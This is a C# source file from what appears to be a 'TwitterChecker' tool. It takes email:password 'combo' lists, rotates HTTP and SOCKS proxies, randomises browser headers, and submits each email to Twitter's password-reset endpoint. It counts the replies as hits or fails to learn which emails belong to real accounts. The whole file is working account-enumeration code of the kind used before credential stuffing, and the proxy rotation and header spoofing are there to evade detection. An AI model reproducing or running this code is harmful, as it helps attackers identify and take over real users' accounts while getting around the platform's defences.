using System;
using System.Drawing;
using System.Threading;
using Colorful;
using Leaf.xNet;
using TwitterChecker;

internal class TwitterVM
{
	private static Random lineRandom = new Random();

	public static void Start(Data combo)
	{
		try
		{
			using HttpRequest httpRequest = new HttpRequest();
			if (readConfig.useProxy)
			{
				string text = Helper.ProxyList[lineRandom.Next(0, Helper.ProxyList.Count - 1)];
				string[] array = text.Split(':');
				if (readConfig.proxyType.ToLower() == "http" || readConfig.proxyType.ToLower() == "https")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(array[0] + ":" + array[1]);
					if (array.Length == 4)
					{
						httpRequest.Proxy.Username = array[2].ToString();
						httpRequest.Proxy.Password = array[3].ToString();
					}
				}
				else if (readConfig.proxyType.ToLower() == "socks4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(array[0] + ":" + array[1]);
					if (array.Length == 4)
					{
						httpRequest.Proxy.Username = array[2].ToString();
						httpRequest.Proxy.Password = array[3].ToString();
					}
				}
				else if (readConfig.proxyType.ToLower() == "socks5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(array[0] + ":" + array[1]);
					if (array.Length == 4)
					{
						httpRequest.Proxy.Username = array[2].ToString();
						httpRequest.Proxy.Password = array[3].ToString();
					}
				}
				else
				{
					Colorful.Console.WriteLine("Invalid type proxy!", Color.Red);
					Colorful.Console.ReadLine();
					Environment.Exit(0);
				}
			}
			httpRequest.IgnoreProtocolErrors = true;
			httpRequest.UseCookies = true;
			httpRequest.UserAgentRandomize();
			httpRequest.AddHeader("referer", "https://twitter.com/account/begin_password_reset?lang=en");
			httpRequest.AddHeader("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"");
			httpRequest.AddHeader("sec-ch-ua-mobile", "?0");
			httpRequest.AddHeader("sec-fetch-dest", "document");
			httpRequest.AddHeader("sec-fetch-mode", "navigate");
			httpRequest.AddHeader("sec-fetch-site", "same-origin");
			httpRequest.AddHeader("sec-fetch-user", "?1");
			httpRequest.AddHeader("upgrade-insecure-requests", "1");
			httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36";
			httpRequest.Cookies = new CookieStorage();
			HttpResponse httpResponse = httpRequest.Post("https://twitter.com/account/begin_password_reset", "authenticity_token=83d79307b093791a0a023d2498ed70b4e268eb1f&account_identifier=" + combo.Email, "application/x-www-form-urlencoded");
			string text2 = httpResponse.ToString();
			StatsVM.DRUGICHECKED++;
			if (text2.Contains("Send an email to") || text2.Contains("We found more than one account with that information") || text2.Contains("Enter your username to continue") || text2.Contains("Enter your phone number to continue"))
			{
				StatsVM.NORMALHITS++;
				StatsVM.DRUGICHECKED++;
			}
			else if (text2.Contains("We couldn't find your account with that information"))
			{
				StatsVM.NORMALFAILS++;
				StatsVM.DRUGICHECKED++;
			}
		}
		catch (Exception)
		{
			Interlocked.Increment(ref StatsVM.NORMALRETRIES);
			Data item = new Data(combo.Email, combo.Pass);
			Helper.ComboQueue.Enqueue(item);
		}
	}
}
